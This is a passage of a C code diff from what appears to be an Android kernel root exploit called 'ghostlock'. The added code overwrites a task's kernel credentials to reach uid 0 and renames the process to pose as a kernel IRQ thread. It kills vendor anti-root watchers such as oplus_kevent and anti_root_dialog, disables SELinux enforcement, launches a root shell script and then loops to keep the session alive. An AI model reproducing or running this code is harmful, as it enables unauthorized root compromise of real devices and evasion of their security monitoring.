+  /* Prefer self so getuid() is in-process. Child real_cred is reporting
+   * root only (wedged, cred still 2000). Watchers muted just above. */
+  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 8) {
     use_task = lself.x28;
     ucnt = lself.x28_cnt;
-    who = "self_x28_p0";
-  } else if (p0_dram_ptr(lch.x28) && lch.x28_cnt >= 8 &&
-             lch.x28 != lself.x28) {
-    use_task = lch.x28;
-    ucnt = lch.x28_cnt;
-    who = "child_x28_p0";
+    who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
   } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 8 &&
              lch.x28 != lself.x28) {
     use_task = lch.x28;
     ucnt = lch.x28_cnt;
-    who = "child_x28";
-  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 8) {
-    use_task = lself.x28;
-    ucnt = lself.x28_cnt;
-    who = "self_x28";
+    who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
   }
 
   {
@@ -1376,9 +2154,23 @@ static int uid0_cred_walk(void) {
    */
   (void)wrapped;
   g_cred_copy = 0;
-  uid0_one_store(use_task + TASK_CRED_OFF, "cred");
+  /* One punch. Subjective cred so getuid()/capable() see 0 (Z33 real_cred
+   * only fooled /proc/status). Kernel kevent fires on 2000→0; kill the
+   * userspace half (oplus_kevent / anti_root_dialog) before it reboots. */
+  {
+    int self = (who[0] == 's');
+    pid_t watch[32];
+    int nw = uid0_scan_watchers(watch, 32);
+    prctl(PR_SET_NAME, "irq/0-kgsl", 0, 0, 0);
+    uintptr_t slot = use_task + TASK_CRED_OFF;
+    uid0_one_store(slot, self ? "self_cred" : "child_cred");
+    uid0_kill_watchers(watch, nw);
+    nw = uid0_scan_watchers(watch, 32);
+    uid0_kill_watchers(watch, nw);
+  }
   uint32_t self_uid_now = (uint32_t)getuid();
-  pr_info("UID0 getuid_after_store=%u who=%s\n", self_uid_now, who);
+  pr_info("UID0 getuid_after_store=%u euid=%u who=%s\n", self_uid_now,
+          (uint32_t)geteuid(), who);
   fflush(stdout);
 
   write(pipes.cmd_w, "C", 1);
@@ -1392,54 +2184,77 @@ static int uid0_cred_walk(void) {
             (ssize_t)sizeof(child_uid))
       child_uid = 9999;
   }
-  uint32_t status_uid = 9999;
-  {
-    char path[64], line[192];
-    snprintf(path, sizeof(path), "/proc/%d/status", (int)child);
-    FILE *sf = fopen(path, "r");
-    if (sf) {
-      while (fgets(line, sizeof(line), sf)) {
-        unsigned u = 9999;
-        if (sscanf(line, "Uid: %u", &u) == 1) {
-          status_uid = u;
-          break;
-        }
-      }
-      fclose(sf);
-    }
-  }
+  char cpath[64];
+  snprintf(cpath, sizeof(cpath), "/proc/%d/status", (int)child);
+  uint32_t status_uid = status_uid_of(cpath);
+  uint32_t self_status = status_uid_of("/proc/self/status");
   uint32_t self_uid = (uint32_t)getuid();
   {
-    char b[96];
-    snprintf(b, sizeof(b), "status_uid=%u getuid=%u self_uid=%u who=%s",
-             status_uid, child_uid, self_uid, who);
+    char b[128];
+    snprintf(b, sizeof(b),
+             "self_uid=%u euid=%u self_status=%u child_getuid=%u "
+             "child_status=%u who=%s",
+             self_uid, (uint32_t)geteuid(), self_status, child_uid, status_uid,
+             who);
     pr_info("UID0 %s\n", b);
     live_sync_log("UID0", b);
   }
 
-  int pf = open("/data/local/tmp/ghostlock_uid0",
-                O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
-  if (pf >= 0) {
-    char b[128];
-    int n = snprintf(b, sizeof(b), "child_uid=%u self_uid=%u who=%s task=%016zx\n",
-                     child_uid, self_uid, who, use_task);
-    if (n > 0)
-      (void)write(pf, b, (size_t)n);
-    close(pf);
-  }
+  uid0_write_proof(self_uid, self_status, child_uid, status_uid, who, use_task);
 
-  if (child_uid == 0 || self_uid == 0 || status_uid == 0) {
-    pr_success("UID0 WIN child is root\n");
+  if (self_uid == 0 || (uint32_t)geteuid() == 0 || child_uid == 0 ||
+      self_status == 0 || status_uid == 0) {
+    pr_success("UID0 WIN getuid=%u euid=%u self_status=%u child=%u who=%s\n",
+               self_uid, (uint32_t)geteuid(), self_status, child_uid, who);
     durable_stage("uid0_WIN");
     live_sync_log("UID0", "WIN");
-    write(pipes.cmd_w, "G", 1);
-    close(pipes.cmd_w);
-    close(pipes.uid_r);
-    sleep(2);
-    return 0;
+    if (self_uid == 0 || (uint32_t)geteuid() == 0) {
+      kill(child, SIGKILL);
+      waitpid(child, NULL, 0);
+      close(pipes.cmd_w);
+      close(pipes.uid_r);
+      {
+        pid_t gc = fork();
+        if (gc == 0) {
+          int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
+          if (efd >= 0) {
+            (void)write(efd, "0", 1);
+            close(efd);
+          }
+          execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh",
+                (char *)NULL);
+          execl("/system/bin/sh", "sh", "-c",
+                "id; echo WIN > /sdcard/ghostlock/aarif/uid0_id.txt",
+                (char *)NULL);
+          _exit(1);
+        }
+      }
+    } else {
+      write(pipes.cmd_w, "G", 1);
+      close(pipes.cmd_w);
+      close(pipes.uid_r);
+    }
+    /* Stay alive: returning exits and we lose the park session. */
+    for (;;) {
+      char eb[4] = {0};
+      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+      if (efd >= 0) {
+        (void)read(efd, eb, 3);
+        close(efd);
+      }
+      pr_info("UID0 HOLD getuid=%u euid=%u status=%u child_status=%u enforce=%.2s\n",
+              (uint32_t)getuid(), (uint32_t)geteuid(),
+              status_uid_of("/proc/self/status"),
+              status_uid_of(cpath), eb);
+      fflush(stdout);
+      fsync(STDOUT_FILENO);
+      uid0_write_proof((uint32_t)getuid(), status_uid_of("/proc/self/status"),
+                       child_uid, status_uid_of(cpath), who, use_task);
+      sleep(15);
+    }
   }
 
-  pr_info("UID0: child still uid=%u — one punch, stopping\n", child_uid);
+  pr_info("UID0: still uid=%u — one punch, stopping\n", self_uid);
   durable_stage("uid0_miss");
   close(pipes.cmd_w);
   close(pipes.uid_r);
